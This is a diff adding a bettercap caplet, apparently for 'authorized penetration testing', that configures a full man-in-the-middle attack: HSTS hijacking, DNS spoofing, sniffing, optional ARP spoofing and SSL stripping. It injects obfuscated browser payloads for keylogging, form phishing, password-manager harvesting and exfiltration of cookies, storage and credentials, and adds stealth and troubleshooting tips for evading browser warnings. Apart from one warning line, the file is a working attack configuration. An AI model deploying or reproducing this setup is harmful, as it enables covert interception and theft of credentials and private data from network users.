@@ -1,0 +1,267 @@
+# Advanced MITM Configuration with Modern Payloads
+# 
+# This caplet demonstrates comprehensive MITM capabilities using 
+# the advanced payload suite for authorized penetration testing.
+#
+# Usage: bettercap -caplet hstshijack-advanced.cap
+#
+# ⚠️ IMPORTANT: Only use with explicit authorization on authorized networks
+
+###############################################################################
+# SSL/HTTPS Interception Configuration
+###############################################################################
+
+# Set custom paths for SSL logging
+set hstshijack.ssl.domains /tmp/hstshijack.ssl.domains
+set hstshijack.ssl.index /tmp/hstshijack.ssl.index
+
+# Whitelist for whitelisting trusted domains  
+set hstshijack.whitelist /usr/local/share/bettercap/caplets/hstshijack/whitelist.json
+
+# Domains to completely ignore (bypass interception)
+set hstshijack.ignore \
+  captive.apple.com,\
+  connectivitycheck.gstatic.com,\
+  detectportal.firefox.com,\
+  www.msftconnecttest.com,\
+  www.apple.com
+
+###############################################################################
+# Payload Selection & Configuration
+###############################################################################
+
+# OPTION 1: Intelligence Gathering (Recommended Starting Point)
+# Captures: keystrokes, form data, network activity, credentials
+#
+# set hstshijack.payloads \
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js,\
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js
+
+# OPTION 2: Maximum Data Extraction (Full Intelligence)
+# Captures: ALL available data from browser
+#
+set hstshijack.payloads \
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/credential-detector.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/form-phisher-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/password-manager-advanced.js
+
+# OPTION 3: Stealth Mode (Minimal Detection)
+# Only core hijack and basic keylogging
+#
+# set hstshijack.payloads \
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js
+
+# OPTION 4: Credential Hunting (Focus on Sensitive Data)
+# Only extracts credentials, passwords, API keys
+#
+# set hstshijack.payloads \
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/credential-detector.js,\
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js
+
+# OPTION 5: Form Targeting (Focused on Authentication)
+# Form harvesting + password manager exploitation
+#
+# set hstshijack.payloads \
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/form-phisher-advanced.js,\
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/password-manager-advanced.js
+
+# OPTION 6: HTTPS Downgrade Attack (SSL Strip)
+# Forces all HTTPS traffic to HTTP for maximum interception
+#
+# set hstshijack.payloads \
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip-advanced.js,\
+#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js
+
+###############################################################################
+# HTTP Proxy Configuration
+###############################################################################
+
+# Load the main hstshijack proxy script
+set http.proxy.script /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+
+# Enable HTTP proxy
+http.proxy on
+
+###############################################################################
+# DNS Spoofing Configuration
+###############################################################################
+
+# Define target domains to spoof
+# Modify these to match your test target
+set dns.spoof.domains \
+  target.com,\
+  www.target.com,\
+  api.target.com,\
+  *.target.com,\
+  login.target.com
+
+# Spoof ALL DNS queries (comprehensive but noisy)
+# set dns.spoof.all true
+
+# Enable DNS spoofing
+dns.spoof on
+
+###############################################################################
+# Network Reconnaissance
+###############################################################################
+
+# Enable network reconnaissance to discover hosts
+net.recon on
+
+# Optional: Set specific network interface
+# set net.interface eth0
+
+# Optional: Set ARP spoofing targets
+# set arp.spoof.targets 192.168.1.100,192.168.1.101
+
+# Uncomment to enable ARP spoofing (requires privilege)
+# arp.spoof on
+
+###############################################################################
+# Logging Configuration
+###############################################################################
+
+# Enable verbose logging for debugging
+# set net.sniff.verbose true
+
+# Log HTTP requests
+net.sniff on
+
+###############################################################################
+# Advanced Configuration Options
+###############################################################################
+
+# SSL index option: toggle to check/skip HSTS preload list
+# "false" = faster but may miss some domains
+# "true" = slower but comprehensive (default)
+set hstshijack.ssl.check true
+
+# Obfuscation: make injected payloads harder to detect
+set hstshijack.obfuscate true
+
+# Target specific hosts for injection (optional)
+# Leave empty to target all hosts
+# set hstshijack.targets *.target.com,target.com
+
+# Replacement hosts (must match target count)
+# set hstshijack.replacements attacker.com,attacker.com
+
+# Block scripts from specific domains
+# set hstshijack.blockscripts adservice.google.com,facebook.com
+
+###############################################################################
+# Execution & Monitoring
+###############################################################################
+
+# Start the attack
+# Listen for callbacks on the embedded HTTP server
+# Logs will be printed to console with colored output
+
+# Useful commands during execution:
+# hstshijack.show         - Display module configuration
+# hstshijack.ssl.domains  - Show all intercepted domains
+# hstshijack.ssl.index    - Show SSL domain index
+# hstshijack.whitelist    - Display whitelisted domains
+
+###############################################################################
+# Payload Output & Logging
+###############################################################################
+
+# All exfiltrated data will be logged to Bettercap console with timestamp
+# Data includes:
+# - Keystroke logs with context
+# - Form submissions with field values  
+# - Cookie data
+# - LocalStorage/SessionStorage contents
+# - IndexedDB database records
+# - Detected credentials (API keys, tokens)
+# - Network activity logs
+# - Service worker information
+# - Browser fingerprinting data
+# - User behavior analytics
+
+# Callback data is received on: obf_hstshijack_path_callback?*
+# Whitelist data on: obf_hstshijack_path_whitelist?*
+
+###############################################################################
+# Performance Tuning
+###############################################################################
+
+# Payload batching intervals (milliseconds)
+# Lower = more frequent transmissions but better latency
+# Higher = less network traffic but delayed data
+
+# Keylogger batch interval (default 3000ms)
+# For aggressive logging: 1000ms
+# For stealth: 10000ms
+
+# Exfiltration batch size (default 100 items)
+# For large datasets: 500 items
+# For minimal footprint: 20 items
+
+###############################################################################
+# Cleanup / Recovery
+###############################################################################
+
+# After testing, remember to:
+# 1. Disable modules: http.proxy off, dns.spoof off, arp.spoof off
+# 2. Clear session data: reset
+# 3. Document all findings
+# 4. Remove payloads from target systems
+# 5. Restore network to normal state
+
+###############################################################################
+# Troubleshooting
+###############################################################################
+
+# Common issues:
+#
+# 1. Payloads not executing?
+#    - Check file paths are correct
+#    - Verify file permissions: chmod 644 *.js
+#    - Check Bettercap console for errors
+#
+# 2. No data exfiltrating?
+#    - Verify HTTP proxy is running: http.proxy on
+#    - Check DNS spoofing targets: dns.spoof.domains
+#    - Ensure clients are on same network
+#    - Monitor Bettercap output for incoming callbacks
+#
+# 3. High network latency?
+#    - Reduce payload batching frequency
+#    - Disable less-critical payloads
+#    - Use compression in exfiltration payloads
+#
+# 4. Browser warnings/errors?
+#    - Enable obfuscation: hstshijack.obfuscate true
+#    - Add domains to whitelist to reduce injection
+#    - Use sslstrip-advanced.js to bypass CSP
+
+###############################################################################
+# Additional Resources
+###############################################################################
+
+# Documentation:
+# - Advanced Payloads: /hstshijack/payloads/ADVANCED_README.md
+# - Bettercap Docs: https://www.bettercap.org/
+# - OWASP MITM: https://owasp.org/
+#
+# Related Caplets:
+# - hstshijack.cap - Original HTTPS interception
+# - jsinject.cap - Simple JS injection
+# - http-req-dump.cap - Log HTTP requests
+# - steal-cookies.cap - Cookie harvesting
+#
+# Next Steps:
+# 1. Test with simple targets first
+# 2. Monitor Bettercap output for data
+# 3. Parse callbacks from HTTP server logs
+# 4. Aggregate and analyze harvested data
+# 5. Document findings in pentest report
+
+###############################################################################
